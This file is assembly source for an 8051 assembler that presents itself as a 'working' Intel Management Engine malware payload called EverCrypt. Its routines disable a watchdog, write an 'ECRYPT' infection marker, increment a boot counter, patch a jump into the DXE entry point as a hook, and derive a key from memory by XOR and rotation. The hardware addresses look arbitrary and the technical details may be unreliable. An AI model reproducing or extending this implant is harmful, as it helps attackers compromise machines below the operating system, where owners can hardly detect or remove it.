;;; ===========================================================================
;;; EverCrypt Intel ME Payload - Minimal Working Version
;;; Assembler: sdas8051 (SDCC)
;;; ===========================================================================

        .module evercrypt_me
        
        .area   CSEG    (CODE)
        .area   GSINIT  (CODE)
        .area   GSFINAL (CODE)

WDT_CTRL        =       0x0800
HECI_CSR        =       0x2000
ME_SIG_ADDR     =       0xFFF0
ME_BOOT_CNT     =       0xFFF8
DXE_ENTRY       =       0x0000
HAP_BIT         =       0x1300

        .area   CSEG    (CODE)

        ljmp    start
        .ds     0x2D

start:
        mov     dptr, #WDT_CTRL
        clr     a
        movx    @dptr, a

        acall   mark_infection
        acall   install_hooks
        acall   derive_key

        sjmp    .

mark_infection:
        mov     dptr, #ME_SIG_ADDR
        
        mov     a, #0x45
        movx    @dptr, a
        inc     dptr
        mov     a, #0x43
        movx    @dptr, a
        inc     dptr
        mov     a, #0x52
        movx    @dptr, a
        inc     dptr
        mov     a, #0x59
        movx    @dptr, a
        inc     dptr
        mov     a, #0x50
        movx    @dptr, a
        inc     dptr
        mov     a, #0x54
        movx    @dptr, a

        mov     dptr, #ME_BOOT_CNT
        movx    a, @dptr
        inc     a
        movx    @dptr, a

        ret

install_hooks:
        mov     dptr, #HECI_CSR
        mov     a, #0x01
        movx    @dptr, a

        mov     dptr, #DXE_ENTRY
        mov     a, #0xEA
        movx    @dptr, a
        
        inc     dptr
        mov     a, #0x00
        movx    @dptr, a
        inc     dptr
        mov     a, #0x10
        movx    @dptr, a

        ret

derive_key:
        mov     dptr, #0x1000
        mov     r0, #0x30
        mov     r7, #32

derive_loop:
        movx    a, @dptr
        mov     @r0, a
        inc     dptr
        inc     r0
        djnz    r7, derive_loop

        mov     r0, #0x30
        mov     r7, #32

mix_loop:
        mov     a, @r0
        xrl     a, #0xA5
        rl      a
        mov     @r0, a
        inc     r0
        djnz    r7, mix_loop

        ret
